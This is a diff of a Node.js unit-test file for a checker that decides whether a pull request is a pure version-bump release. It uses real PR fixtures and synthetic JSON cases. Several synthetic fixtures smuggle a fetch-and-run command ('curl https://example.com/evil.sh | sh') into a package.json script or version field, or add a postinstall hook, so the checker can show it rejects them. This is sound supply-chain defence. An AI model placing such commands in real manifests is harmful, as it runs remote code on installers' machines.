@@ -1,16 +1,42 @@
 /**
- * Unit tests for the pure `classify` release-exception checker in
- * release-exception.js.
+ * Unit tests for the release-exception checkers in release-exception.js.
  *
- * The two "real PR" fixtures use the exact changed-file lists of PR #190
- * (understanding-gate 0.5.0, pure) and PR #215 (grounding-mcp 0.11.0, NOT
- * pure), captured via `gh pr view <n> --repo LanNguyenSi/agent-grounding
- * --json files` (read-only, no repo state changed). Uses Node's built-in
- * test runner (`node --test`), matching this repo's other root scripts.
+ * `classify(paths)` (path-shape only) is covered against the exact
+ * changed-file lists of PR #190 (understanding-gate 0.5.0, pure) and PR
+ * #215 (grounding-mcp 0.11.0, NOT pure), captured via `gh pr view <n>
+ * --repo LanNguyenSi/agent-grounding --json files` (read-only, no repo
+ * state changed).
+ *
+ * `classifyPullFiles(files, { readFile, baseRef, headRef })` (status +
+ * parsed-content aware) is covered two ways:
+ *
+ *   - The PURE assertions replay PR #190's real base/head file content,
+ *     fetched read-only via `gh api
+ *     repos/LanNguyenSi/agent-grounding/contents/<path>?ref=<sha>` (base
+ *     `5dc0cbc048a6b59c35b0fbd1810cc20c7f88a28a`, head
+ *     `663a19b4462f001c21252dbdf1a482d0a608247d`, both from `gh pr view 190
+ *     --json baseRefOid,headRefOid`) and checked in under
+ *     `scripts/fixtures/release-exception/`. `pr190-package-lock*.json` is
+ *     TRIMMED from the real 8975-line lockfile down to its `name`,
+ *     `version`, `lockfileVersion`, `requires`, and exactly the two
+ *     `packages` entries this check reads (`""` and
+ *     `packages/understanding-gate`), the other 627 workspace/
+ *     `node_modules` entries carry no signal for this check and are
+ *     dropped; the two kept files are otherwise byte-for-byte the real
+ *     content. `pr190-package*.json` and `pr190-changelog*.md` are the
+ *     real, untrimmed file content (small enough not to need it).
+ *   - The NOT-pure and edge-case assertions use small synthetic in-memory
+ *     JSON fixtures (a fake `readFile` closing over a `{ [ref]: { [path]:
+ *     text } }` map), real PR content is unnecessary for isolating one
+ *     disqualifying condition at a time.
+ *
+ * Uses Node's built-in test runner (`node --test`), matching this repo's
+ * other root scripts.
  */
 const test = require('node:test');
 const assert = require('node:assert/strict');
 const { execFileSync } = require('node:child_process');
+const fs = require('node:fs');
 const path = require('node:path');
 const {
   classify,
@@ -20,6 +46,42 @@ const {
 } = require('./release-exception');
 
 const SCRIPT_PATH = path.join(__dirname, 'release-exception.js');
+const FIXTURE_DIR = path.join(__dirname, 'fixtures', 'release-exception');
+
+function readFixture(name) {
+  return fs.readFileSync(path.join(FIXTURE_DIR, name), 'utf8');
+}
+
+// PR #190's real base/head commit shas (`gh pr view 190 --repo
+// LanNguyenSi/agent-grounding --json baseRefOid,headRefOid`).
+const PR_190_BASE_REF = '5dc0cbc048a6b59c35b0fbd1810cc20c7f88a28a';
+const PR_190_HEAD_REF = '663a19b4462f001c21252dbdf1a482d0a608247d';
+
+const PR_190_CONTENT = {
+  [PR_190_BASE_REF]: {
+    'packages/understanding-gate/package.json': readFixture('pr190-package.base.json'),
+    'packages/understanding-gate/CHANGELOG.md': readFixture('pr190-changelog.base.md'),
+    'package-lock.json': readFixture('pr190-package-lock.trimmed.base.json'),
+  },
+  [PR_190_HEAD_REF]: {
+    'packages/understanding-gate/package.json': readFixture('pr190-package.head.json'),
+    'packages/understanding-gate/CHANGELOG.md': readFixture('pr190-changelog.head.md'),
+    'package-lock.json': readFixture('pr190-package-lock.trimmed.head.json'),
+  },
+};
+
+/**
+ * Build a `readFile(ref, path)` from a `{ [ref]: { [path]: text } }` map;
+ * an absent ref or path resolves to `null` (matching the real reader's
+ * "absent at this ref" contract).
+ */
+function fakeReaderFrom(map) {
+  return async (ref, filePath) => {
+    const atRef = map[ref];
+    if (!atRef || !(filePath in atRef)) return null;
+    return atRef[filePath];
+  };
+}
 
 // PR #190 (understanding-gate-v0.5.0), captured via `gh pr view 190
 // --repo LanNguyenSi/agent-grounding --json files`.
@@ -167,185 +229,374 @@ test('classify(): any number of packages in one pure list is still pure (not cap
   assert.deepEqual(verdict.rejected, []);
 });
 
-// ── classifyPullFiles(): status + content-aware classification ─────────
-//
-// PR #190's real package.json / package-lock.json patches, captured via
-// `gh api repos/LanNguyenSi/agent-grounding/pulls/190/files
-// --jq '.[] | {filename, status, patch}'` (read-only, no repo state
-// changed): a real version-bump diff touches nothing but a `"version":`
-// value line in each file.
+// ── classifyPullFiles(): status + parsed-content-aware classification ──
 
-const PR_190_PACKAGE_LOCK_PATCH =
-  '@@ -8947,7 +8947,7 @@\n' +
-  '     },\n' +
-  '     "packages/understanding-gate": {\n' +
-  '       "name": "@lannguyensi/understanding-gate",\n' +
-  '-      "version": "0.4.11",\n' +
-  '+      "version": "0.5.0",\n' +
-  '       "license": "MIT",\n' +
-  '       "dependencies": {\n' +
-  '         "@lannguyensi/hypothesis-tracker": "0.6.0",';
-
-const PR_190_PACKAGE_JSON_PATCH =
-  '@@ -1,6 +1,6 @@\n' +
-  ' {\n' +
-  '   "name": "@lannguyensi/understanding-gate",\n' +
-  '-  "version": "0.4.11",\n' +
-  '+  "version": "0.5.0",\n' +
-  '   "description": "Pre-execution gate that asks AI agents to produce an Understanding Report before acting",\n' +
-  '   "license": "MIT",\n' +
-  '   "engines": {';
-
-test('classifyPullFiles(): PR #190 real package-lock.json version-bump patch is pure', () => {
-  const verdict = classifyPullFiles([
-    { filename: 'package-lock.json', status: 'modified', patch: PR_190_PACKAGE_LOCK_PATCH },
-  ]);
+test('classifyPullFiles(): PR #190 real base/head content, all three files pure', async () => {
+  const files = [
+    { filename: 'package-lock.json', status: 'modified' },
+    { filename: 'packages/understanding-gate/CHANGELOG.md', status: 'modified' },
+    { filename: 'packages/understanding-gate/package.json', status: 'modified' },
+  ];
+  const verdict = await classifyPullFiles(files, {
+    readFile: fakeReaderFrom(PR_190_CONTENT),
+    baseRef: PR_190_BASE_REF,
+    headRef: PR_190_HEAD_REF,
+  });
   assert.equal(verdict.pure_release, true);
-  assert.deepEqual(verdict.allowed, ['package-lock.json']);
+  assert.deepEqual(verdict.allowed.sort(), [
+    'package-lock.json',
+    'packages/understanding-gate/CHANGELOG.md',
+    'packages/understanding-gate/package.json',
+  ]);
+  assert.deepEqual(verdict.rejected, []);
 });
 
-test('classifyPullFiles(): PR #190 real package.json version-bump patch is pure', () => {
-  const verdict = classifyPullFiles([
-    {
-      filename: 'packages/understanding-gate/package.json',
-      status: 'modified',
-      patch: PR_190_PACKAGE_JSON_PATCH,
-    },
-  ]);
+test('classifyPullFiles(): PR #190 real package.json alone is pure', async () => {
+  const verdict = await classifyPullFiles(
+    [{ filename: 'packages/understanding-gate/package.json', status: 'modified' }],
+    { readFile: fakeReaderFrom(PR_190_CONTENT), baseRef: PR_190_BASE_REF, headRef: PR_190_HEAD_REF },
+  );
   assert.equal(verdict.pure_release, true);
   assert.deepEqual(verdict.allowed, ['packages/understanding-gate/package.json']);
 });
 
-test('classifyPullFiles(): a package.json patch that also adds a postinstall script is NOT pure', () => {
-  const patch =
-    '@@ -1,6 +1,7 @@\n' +
-    ' {\n' +
-    '   "name": "@lannguyensi/foo",\n' +
-    '-  "version": "0.11.0",\n' +
-    '+  "version": "0.11.1",\n' +
-    '+  "postinstall": "node scripts/setup.js",\n' +
-    '   "license": "MIT",';
-  const verdict = classifyPullFiles([
-    { filename: 'package.json', status: 'modified', patch },
-  ]);
-  assert.equal(verdict.pure_release, false);
-  assert.deepEqual(verdict.rejected, ['package.json']);
-});
-
-test('classifyPullFiles(): a package-lock.json patch that changes "resolved" is NOT pure', () => {
-  const patch =
-    '@@ -100,8 +100,8 @@\n' +
-    '     "packages/foo": {\n' +
-    '       "name": "@lannguyensi/foo",\n' +
-    '-      "version": "0.11.0",\n' +
-    '-      "resolved": "file:packages/foo",\n' +
-    '+      "version": "0.11.1",\n' +
-    '+      "resolved": "file:packages/foo-new",\n' +
-    '       "license": "MIT",';
-  const verdict = classifyPullFiles([
-    { filename: 'package-lock.json', status: 'modified', patch },
-  ]);
-  assert.equal(verdict.pure_release, false);
-  assert.deepEqual(verdict.rejected, ['package-lock.json']);
-});
-
-test('classifyPullFiles(): a package.json entry with no patch field at all is NOT pure (fail-closed)', () => {
-  const verdict = classifyPullFiles([
-    { filename: 'package.json', status: 'modified' },
-  ]);
-  assert.equal(verdict.pure_release, false);
-  assert.deepEqual(verdict.rejected, ['package.json']);
-});
-
-test('classifyPullFiles(): a version line with a trailing comma is pure', () => {
-  const patch = '@@ -1,3 +1,3 @@\n {\n-  "version": "0.1.0",\n+  "version": "0.1.1",';
-  const verdict = classifyPullFiles([
-    { filename: 'package.json', status: 'modified', patch },
-  ]);
+test('classifyPullFiles(): PR #190 real (trimmed) package-lock.json alone is pure', async () => {
+  const verdict = await classifyPullFiles(
+    [{ filename: 'package-lock.json', status: 'modified' }],
+    { readFile: fakeReaderFrom(PR_190_CONTENT), baseRef: PR_190_BASE_REF, headRef: PR_190_HEAD_REF },
+  );
   assert.equal(verdict.pure_release, true);
+  assert.deepEqual(verdict.allowed, ['package-lock.json']);
 });
 
-test('classifyPullFiles(): a version line with no trailing comma (last key) is pure', () => {
-  const patch = '@@ -1,3 +1,3 @@\n {\n-  "version": "0.1.0"\n+  "version": "0.1.1"\n }';
-  const verdict = classifyPullFiles([
-    { filename: 'package.json', status: 'modified', patch },
-  ]);
-  assert.equal(verdict.pure_release, true);
-});
-
-test('classifyPullFiles(): a "version" key nested somewhere unexpected is still fine (it is a version value)', () => {
-  const patch =
-    '@@ -1,6 +1,6 @@\n' +
-    '     "some-nested-dep": {\n' +
-    '       "name": "some-nested-dep",\n' +
-    '-      "version": "1.2.2",\n' +
-    '+      "version": "1.2.3",\n' +
-    '       "license": "MIT",';
-  const verdict = classifyPullFiles([
-    { filename: 'package-lock.json', status: 'modified', patch },
-  ]);
-  assert.equal(verdict.pure_release, true);
-});
-
-test('classifyPullFiles(): a CHANGELOG.md entry has no content constraint (prose changes freely)', () => {
-  const verdict = classifyPullFiles([
-    {
-      filename: 'CHANGELOG.md',
-      status: 'modified',
-      patch: '@@ -1,3 +1,5 @@\n # Changelog\n+\n+## 0.5.0\n+- did a thing\n',
+test('classifyPullFiles(): the scripts.version smuggle (a "version" script key added) is NOT pure', async () => {
+  const readFile = fakeReaderFrom({
+    base: { 'package.json': JSON.stringify({ version: '1.0.0', scripts: { build: 'tsc' } }) },
+    head: {
+      'package.json': JSON.stringify({
+        version: '1.0.1',
+        scripts: { build: 'tsc', version: 'curl https://example.com/evil.sh | sh' },
+      }),
     },
-  ]);
-  assert.equal(verdict.pure_release, true);
-});
-
-test('classifyPullFiles(): a rename into an allowlisted CHANGELOG.md path is NOT pure', () => {
-  const verdict = classifyPullFiles([
-    {
-      filename: 'packages/x/CHANGELOG.md',
-      status: 'renamed',
-      previous_filename: 'packages/x/HISTORY.md',
-      patch: '@@ -1,1 +1,1 @@\n-old\n+old\n',
-    },
-  ]);
+  });
+  const verdict = await classifyPullFiles(
+    [{ filename: 'package.json', status: 'modified' }],
+    { readFile, baseRef: 'base', headRef: 'head' },
+  );
   assert.equal(verdict.pure_release, false);
-  assert.deepEqual(verdict.rejected, ['packages/x/CHANGELOG.md']);
+  assert.equal(verdict.rejected.length, 1);
+  assert.equal(verdict.rejected[0].filename, 'package.json');
+  assert.match(verdict.rejected[0].reason, /^disallowed-json-path:\$\.scripts\.version$/);
 });
 
-test('classifyPullFiles(): a removed package.json is NOT pure', () => {
-  const verdict = classifyPullFiles([
-    { filename: 'package.json', status: 'removed', patch: '@@ -1,3 +0,0 @@\n-{}\n' },
-  ]);
+test('classifyPullFiles(): a dependency literally named "version" is NOT pure', async () => {
+  const readFile = fakeReaderFrom({
+    base: { 'package.json': JSON.stringify({ version: '1.0.0', dependencies: { foo: '1.0.0' } }) },
+    head: {
+      'package.json': JSON.stringify({
+        version: '1.0.1',
+        dependencies: { foo: '1.0.0', version: '2.0.0' },
+      }),
+    },
+  });
+  const verdict = await classifyPullFiles(
+    [{ filename: 'package.json', status: 'modified' }],
+    { readFile, baseRef: 'base', headRef: 'head' },
+  );
   assert.equal(verdict.pure_release, false);
-  assert.deepEqual(verdict.rejected, ['package.json']);
+  assert.match(verdict.rejected[0].reason, /^disallowed-json-path:\$\.dependencies\.version$/);
 });
 
-test('classifyPullFiles(): a multi-package pure list (added + modified) stays pure', () => {
-  const verdict = classifyPullFiles([
-    { filename: 'package.json', status: 'modified', patch: PR_190_PACKAGE_JSON_PATCH },
-    { filename: 'package-lock.json', status: 'modified', patch: PR_190_PACKAGE_LOCK_PATCH },
-    {
-      filename: 'packages/a/CHANGELOG.md',
-      status: 'modified',
-      patch: '@@ -1,1 +1,3 @@\n # Changelog\n+\n+## 1.0.0\n',
+test('classifyPullFiles(): a package.json that also adds a postinstall script is NOT pure', async () => {
+  const readFile = fakeReaderFrom({
+    base: { 'package.json': JSON.stringify({ version: '0.11.0' }) },
+    head: { 'package.json': JSON.stringify({ version: '0.11.1', postinstall: 'node scripts/setup.js' }) },
+  });
+  const verdict = await classifyPullFiles(
+    [{ filename: 'package.json', status: 'modified' }],
+    { readFile, baseRef: 'base', headRef: 'head' },
+  );
+  assert.equal(verdict.pure_release, false);
+  assert.match(verdict.rejected[0].reason, /^disallowed-json-path:\$\.postinstall$/);
+});
+
+test('classifyPullFiles(): a package-lock.json that also changes "resolved" is NOT pure', async () => {
+  const base = {
+    version: '0.1.0',
+    packages: {
+      '': { version: '0.1.0' },
+      'packages/foo': { version: '0.11.0', resolved: 'file:packages/foo' },
     },
-    {
-      filename: 'packages/b/CHANGELOG.md',
-      status: 'added',
-      patch: '@@ -0,0 +1,1 @@\n+# Changelog\n',
+  };
+  const head = {
+    version: '0.1.0',
+    packages: {
+      '': { version: '0.1.0' },
+      'packages/foo': { version: '0.11.1', resolved: 'file:packages/foo-new' },
     },
-  ]);
+  };
+  const readFile = fakeReaderFrom({
+    base: { 'package-lock.json': JSON.stringify(base) },
+    head: { 'package-lock.json': JSON.stringify(head) },
+  });
+  const verdict = await classifyPullFiles(
+    [{ filename: 'package-lock.json', status: 'modified' }],
+    { readFile, baseRef: 'base', headRef: 'head' },
+  );
+  assert.equal(verdict.pure_release, false);
+  assert.match(verdict.rejected[0].reason, /^disallowed-json-path:\$\.packages\["packages\/foo"\]\.resolved$/);
+});
+
+test('classifyPullFiles(): an added dependency key is NOT pure', async () => {
+  const readFile = fakeReaderFrom({
+    base: { 'package.json': JSON.stringify({ version: '1.0.0', dependencies: { a: '1.0.0' } }) },
+    head: {
+      'package.json': JSON.stringify({
+        version: '1.0.1',
+        dependencies: { a: '1.0.0', b: '2.0.0' },
+      }),
+    },
+  });
+  const verdict = await classifyPullFiles(
+    [{ filename: 'package.json', status: 'modified' }],
+    { readFile, baseRef: 'base', headRef: 'head' },
+  );
+  assert.equal(verdict.pure_release, false);
+  assert.match(verdict.rejected[0].reason, /^disallowed-json-path:\$\.dependencies\.b$/);
+});
+
+test('classifyPullFiles(): a removed key is NOT pure', async () => {
+  const readFile = fakeReaderFrom({
+    base: { 'package.json': JSON.stringify({ version: '1.0.0', description: 'foo' }) },
+    head: { 'package.json': JSON.stringify({ version: '1.0.1' }) },
+  });
+  const verdict = await classifyPullFiles(
+    [{ filename: 'package.json', status: 'modified' }],
+    { readFile, baseRef: 'base', headRef: 'head' },
+  );
+  assert.equal(verdict.pure_release, false);
+  assert.match(verdict.rejected[0].reason, /^disallowed-json-path:\$\.description$/);
+});
+
+test('classifyPullFiles(): an array change under the allowed path is NOT pure', async () => {
+  const readFile = fakeReaderFrom({
+    base: { 'package.json': JSON.stringify({ version: '1.0.0', files: ['dist'] }) },
+    head: { 'package.json': JSON.stringify({ version: '1.0.1', files: ['dist', 'README.md'] }) },
+  });
+  const verdict = await classifyPullFiles(
+    [{ filename: 'package.json', status: 'modified' }],
+    { readFile, baseRef: 'base', headRef: 'head' },
+  );
+  assert.equal(verdict.pure_release, false);
+  assert.match(verdict.rejected[0].reason, /^disallowed-json-path:\$\.files$/);
+});
+
+test('classifyPullFiles(): a version value that is not semver ("^0.1.2") is NOT pure', async () => {
+  const readFile = fakeReaderFrom({
+    base: { 'package.json': JSON.stringify({ version: '0.1.1' }) },
+    head: { 'package.json': JSON.stringify({ version: '^0.1.2' }) },
+  });
+  const verdict = await classifyPullFiles(
+    [{ filename: 'package.json', status: 'modified' }],
+    { readFile, baseRef: 'base', headRef: 'head' },
+  );
+  assert.equal(verdict.pure_release, false);
+  assert.match(verdict.rejected[0].reason, /^non-semver-value:\$\.version$/);
+});
+
+test('classifyPullFiles(): a version value that is a shell command is NOT pure', async () => {
+  const readFile = fakeReaderFrom({
+    base: { 'package.json': JSON.stringify({ version: '1.0.0' }) },
+    head: { 'package.json': JSON.stringify({ version: 'curl https://example.com/evil.sh | sh' }) },
+  });
+  const verdict = await classifyPullFiles(
+    [{ filename: 'package.json', status: 'modified' }],
+    { readFile, baseRef: 'base', headRef: 'head' },
+  );
+  assert.equal(verdict.pure_release, false);
+  assert.match(verdict.rejected[0].reason, /^non-semver-value:\$\.version$/);
+});
+
+test('classifyPullFiles(): a version bump on a disallowed lockfile path (node_modules entry) is NOT pure', async () => {
+  const base = {
+    version: '0.1.0',
+    packages: { '': { version: '0.1.0' }, 'node_modules/x': { version: '1.0.0' } },
+  };
+  const head = {
+    version: '0.1.0',
+    packages: { '': { version: '0.1.0' }, 'node_modules/x': { version: '1.0.1' } },
+  };
+  const readFile = fakeReaderFrom({
+    base: { 'package-lock.json': JSON.stringify(base) },
+    head: { 'package-lock.json': JSON.stringify(head) },
+  });
+  const verdict = await classifyPullFiles(
+    [{ filename: 'package-lock.json', status: 'modified' }],
+    { readFile, baseRef: 'base', headRef: 'head' },
+  );
+  assert.equal(verdict.pure_release, false);
+  assert.match(
+    verdict.rejected[0].reason,
+    /^disallowed-json-path:\$\.packages\["node_modules\/x"\]\.version$/,
+  );
+});
+
+test('classifyPullFiles(): an unparsable (invalid-JSON) file is NOT pure', async () => {
+  const readFile = fakeReaderFrom({
+    base: { 'package.json': '{ not valid json' },
+    head: { 'package.json': JSON.stringify({ version: '1.0.1' }) },
+  });
+  const verdict = await classifyPullFiles(
+    [{ filename: 'package.json', status: 'modified' }],
+    { readFile, baseRef: 'base', headRef: 'head' },
+  );
+  assert.equal(verdict.pure_release, false);
+  assert.equal(verdict.rejected[0].reason, 'parse-error-base');
+});
+
+test('classifyPullFiles(): an unparsable head content is NOT pure', async () => {
+  const readFile = fakeReaderFrom({
+    base: { 'package.json': JSON.stringify({ version: '1.0.0' }) },
+    head: { 'package.json': '{ not valid json' },
+  });
+  const verdict = await classifyPullFiles(
+    [{ filename: 'package.json', status: 'modified' }],
+    { readFile, baseRef: 'base', headRef: 'head' },
+  );
+  assert.equal(verdict.pure_release, false);
+  assert.equal(verdict.rejected[0].reason, 'parse-error-head');
+});
+
+test('classifyPullFiles(): a non-object JSON root (array) is NOT pure', async () => {
+  const readFile = fakeReaderFrom({
+    base: { 'package.json': '["not", "an", "object"]' },
+    head: { 'package.json': JSON.stringify({ version: '1.0.1' }) },
+  });
+  const verdict = await classifyPullFiles(
+    [{ filename: 'package.json', status: 'modified' }],
+    { readFile, baseRef: 'base', headRef: 'head' },
+  );
+  assert.equal(verdict.pure_release, false);
+  assert.equal(verdict.rejected[0].reason, 'non-object-root-base');
+});
+
+test('classifyPullFiles(): an added package.json has no base content, so it is NOT pure', async () => {
+  // readFile returns null for the base ref: the file did not exist there.
+  const readFile = fakeReaderFrom({
+    head: { 'package.json': JSON.stringify({ version: '1.0.0' }) },
+  });
+  const verdict = await classifyPullFiles(
+    [{ filename: 'package.json', status: 'added' }],
+    { readFile, baseRef: 'base', headRef: 'head' },
+  );
+  assert.equal(verdict.pure_release, false);
+  assert.equal(verdict.rejected[0].reason, 'missing-base');
+});
+
+test('classifyPullFiles(): a readFile that throws is NOT pure (fail-closed, not a crash)', async () => {
+  const readFile = async (ref) => {
+    if (ref === 'base') throw new Error('network blip');
+    return JSON.stringify({ version: '1.0.1' });
+  };
+  const verdict = await classifyPullFiles(
+    [{ filename: 'package.json', status: 'modified' }],
+    { readFile, baseRef: 'base', headRef: 'head' },
+  );
+  assert.equal(verdict.pure_release, false);
+  assert.equal(verdict.rejected[0].reason, 'reader-error-base');
+});
+
+test('classifyPullFiles(): a CHANGELOG.md entry has no content constraint and never calls readFile', async () => {
+  const readFile = async () => {
+    throw new Error('readFile must not be called for a CHANGELOG.md entry');
+  };
+  const verdict = await classifyPullFiles(
+    [{ filename: 'CHANGELOG.md', status: 'modified' }],
+    { readFile, baseRef: 'base', headRef: 'head' },
+  );
+  assert.equal(verdict.pure_release, true);
+  assert.deepEqual(verdict.allowed, ['CHANGELOG.md']);
+});
+
+test('classifyPullFiles(): a rename into an allowlisted CHANGELOG.md path is NOT pure', async () => {
+  const readFile = async () => {
+    throw new Error('readFile must not be called for a rejected-by-status entry');
+  };
+  const verdict = await classifyPullFiles(
+    [{ filename: 'packages/x/CHANGELOG.md', status: 'renamed', previous_filename: 'packages/x/HISTORY.md' }],
+    { readFile, baseRef: 'base', headRef: 'head' },
+  );
+  assert.equal(verdict.pure_release, false);
+  assert.equal(verdict.rejected[0].filename, 'packages/x/CHANGELOG.md');
+  assert.equal(verdict.rejected[0].reason, 'disallowed-status:renamed');
+});
+
+test('classifyPullFiles(): a removed package.json is NOT pure', async () => {
+  const readFile = async () => {
+    throw new Error('readFile must not be called for a rejected-by-status entry');
+  };
+  const verdict = await classifyPullFiles(
+    [{ filename: 'package.json', status: 'removed' }],
+    { readFile, baseRef: 'base', headRef: 'head' },
+  );
+  assert.equal(verdict.pure_release, false);
+  assert.equal(verdict.rejected[0].reason, 'disallowed-status:removed');
+});
+
+test('classifyPullFiles(): a missing or non-string filename is rejected with a named reason', async () => {
+  const readFile = async () => {
+    throw new Error('readFile must not be called for an invalid-filename entry');
+  };
+  const verdict = await classifyPullFiles(
+    [{ status: 'modified' }, { filename: 42, status: 'modified' }],
+    { readFile, baseRef: 'base', headRef: 'head' },
+  );
+  assert.equal(verdict.pure_release, false);
+  assert.equal(verdict.rejected.length, 2);
+  for (const entry of verdict.rejected) {
+    assert.equal(entry.filename, null);
+    assert.equal(entry.reason, 'invalid-filename');
+    assert.notEqual(entry.reason, 'undefined');
+  }
+});
+
+test('classifyPullFiles(): a multi-package pure list (added + modified) stays pure', async () => {
+  const files = [
+    { filename: 'packages/understanding-gate/package.json', status: 'modified' },
+    { filename: 'package-lock.json', status: 'modified' },
+    { filename: 'packages/a/CHANGELOG.md', status: 'modified' },
+    { filename: 'packages/b/CHANGELOG.md', status: 'added' },
+  ];
+  const readFile = fakeReaderFrom(PR_190_CONTENT);
+  const verdict = await classifyPullFiles(files, {
+    readFile,
+    baseRef: PR_190_BASE_REF,
+    headRef: PR_190_HEAD_REF,
+  });
   assert.equal(verdict.pure_release, true);
   assert.equal(verdict.rejected.length, 0);
 });
 
-test('classifyPullFiles(): empty file list is NOT pure', () => {
-  const verdict = classifyPullFiles([]);
+test('classifyPullFiles(): empty file list is NOT pure', async () => {
+  const verdict = await classifyPullFiles([], {
+    readFile: async () => null,
+    baseRef: 'base',
+    headRef: 'head',
+  });
   assert.equal(verdict.pure_release, false);
 });
 
-test('classifyPullFiles(): throws TypeError on a non-array input (caller bug, not a verdict)', () => {
-  assert.throws(() => classifyPullFiles('package.json'), TypeError);
-  assert.throws(() => classifyPullFiles(null), TypeError);
+test('classifyPullFiles(): throws TypeError on a non-array input (caller bug, not a verdict)', async () => {
+  const opts = { readFile: async () => null, baseRef: 'base', headRef: 'head' };
+  await assert.rejects(() => classifyPullFiles('package.json', opts), TypeError);
+  await assert.rejects(() => classifyPullFiles(null, opts), TypeError);
+});
+
+test('classifyPullFiles(): throws TypeError when readFile is not a function', async () => {
+  await assert.rejects(
+    () => classifyPullFiles([{ filename: 'CHANGELOG.md', status: 'modified' }], {}),
+    TypeError,
+  );
 });
 
 // ── CLI ────────────────────────────────────────────────────────────────
